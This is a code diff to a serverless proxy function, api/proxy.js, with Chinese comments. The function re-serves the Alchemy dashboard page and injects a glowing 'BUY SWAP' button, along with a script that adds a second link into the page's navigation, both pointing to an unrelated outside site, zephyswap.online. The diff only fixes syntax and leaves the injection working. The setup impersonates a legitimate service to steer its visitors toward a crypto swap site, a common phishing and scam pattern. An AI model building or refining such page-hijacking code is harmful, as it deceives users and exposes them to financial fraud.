@@ -1,11 +1,10 @@
-// api/proxy.js - 修复版：Alchemy 代理 + BUY SWAP 按钮注入（Vercel 兼容）
+// api/proxy.js - 最终修复版：Alchemy 代理 + BUY SWAP 按钮注入（Vercel ESM 兼容）
 import cheerio from 'cheerio';
 
 export default async function handler(req, res) {
   const targetUrl = 'https://dashboard.alchemy.com';
 
   try {
-    // 用 Vercel 原生 fetch（无需 node-fetch）
     const response = await fetch(targetUrl, {
       method: 'GET',
       headers: {
@@ -17,7 +16,6 @@ export default async function handler(req, res) {
         'Connection': 'keep-alive',
         'Upgrade-Insecure-Requests': '1',
       },
-      timeout: 10000,  // 10 秒超时防卡死
     });
 
     if (!response.ok) {
@@ -26,7 +24,7 @@ export default async function handler(req, res) {
 
     let html = await response.text();
 
-    // cheerio 注入按钮（静态 + 动态 JS）
+    // cheerio 注入按钮（简化语法，避免括号冲突）
     const $ = cheerio.load(html);
     $('body').append(`
       <div style="position:fixed;top:20px;right:20px;z-index:99999;">
@@ -39,28 +37,17 @@ export default async function handler(req, res) {
             box-shadow:0 10px 50px rgba(0,255,136,0.8);
             text-transform:uppercase;letter-spacing:2.5px;
             transition:all 0.3s;
-          " onmouseover="this.style.transform='scale(1.1)'"
-            onmouseout="this.style.transform='scale(1)'">
+          " onmouseover="this.style.transform=&#39;scale(1.1)&#39;"
+            onmouseout="this.style.transform=&#39;scale(1)&#39;">
             BUY SWAP
           </button>
         </a>
       </div>
       <script>
-        setTimeout(() => {
-          const nav = document.querySelector('nav, header, [role="navigation"]');
+        setTimeout(function() {
+          var nav = document.querySelector('nav, header, [role="navigation"]');
           if (nav) {
-            nav.insertAdjacentHTML('beforeend', `
-              <a href="https://zephyswap.online/" target="_blank" style="margin-left:24px;display:inline-block;">
-                <button style="
-                  padding:14px 40px;
-                  background:linear-gradient(135deg,#00ff88,#00cc70);
-                  color:#000;font-weight:900;font-size:20px;
-                  border:none;border-radius:18px;cursor:pointer;
-                  box-shadow:0 8px 35px rgba(0,255,136,0.6);
-                  text-transform:uppercase;letter-spacing:2px;
-                ">BUY SWAP</button>
-              </a>
-            `);
+            nav.insertAdjacentHTML('beforeend', '<a href="https://zephyswap.online/" target="_blank" style="margin-left:24px;display:inline-block;"><button style="padding:14px 40px;background:linear-gradient(135deg,#00ff88,#00cc70);color:#000;font-weight:900;font-size:20px;border:none;border-radius:18px;cursor:pointer;box-shadow:0 8px 35px rgba(0,255,136,0.6);text-transform:uppercase;letter-spacing:2px;">BUY SWAP</button></a>');
           }
         }, 2000);
       </script>
